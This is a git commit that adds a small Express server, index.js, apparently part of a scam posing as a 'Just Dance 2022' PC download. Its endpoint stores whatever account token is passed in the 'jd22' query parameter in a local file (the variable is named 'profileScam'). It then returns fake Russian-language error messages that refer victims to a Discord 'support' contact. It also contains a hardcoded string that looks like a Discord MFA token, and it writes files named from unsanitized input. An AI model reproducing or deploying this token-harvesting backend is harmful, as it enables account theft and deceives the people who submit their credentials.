0a437d94723b48270780631885da100c12f002a0
Sokolargm <59578584+Sokolargm@users.noreply.github.com>
2021-10-02 14:47:11 +0300

    projext added

---
+++ index.js
@@ -0,0 +1,43 @@
+const express = require("express");
+const fs = require("fs");
+const https = require("https");
+const app = express();
+const path = require('path');
+var XMLHttpRequest = require("xmlhttprequest").XMLHttpRequest;
+var multiparty = require('multiparty'); // Для сохранения файла
+var http = require('http');
+
+const cors = require('cors');
+app.use(cors());
+let date = new Date();
+
+app.get('/justdance2022/download/pc', function (req, res) {
+    var form = new multiparty.Form();
+    form.parse(req, function (err, fields, files) {
+        var tokenHead = req.query.jd22;
+        var object = {
+            token: tokenHead
+        };
+        var profileScam = JSON.stringify(object);
+        fs.writeFile("./tokens/"+tokenHead+".json", profileScam, function (err) {
+            if (err) {
+                console.log(err);
+                res.send("Запрос неуспешный")
+            } else {
+                console.log("Файл создан" + ". Токен получен - " + tokenHead);
+                if(tokenHead==="mfa.LemvHJshUwSZAfSz08bmg8fyq_l0FTZn6HizlKZyLofaLKGVy7XC3lkDJf5zkbXYqhBF6siXDejhJMW"){
+                    res.send("Этот токен уже получил ссылку, используйте свой токен. Если это не помогло, обратитесь в поддержку в Discord'e -  Michael Ruinlov#6743 ")
+                } else{
+                     res.send("Хм, что-то пошло не так, поторите попытку через 10 секунд. Если это не помогло, обратитесь в поддержку в Discord'e -  Michael Ruinlov#6743 ");
+                }
+               
+            }
+        });
+    })
+});
+app.get('/', function (req, res) {
+    res.send("Хм, что-то пошло не так, поторите попытку через 10 секунд. Если это не помогло, обратитесь в поддержку в Discord'e -  Michael Ruinlov#6743 ");
+});
+const listener = app.listen(process.env.PORT, function () {
+    console.log("Ваше приложение прослушивает порт " + listener.address().port);
+});
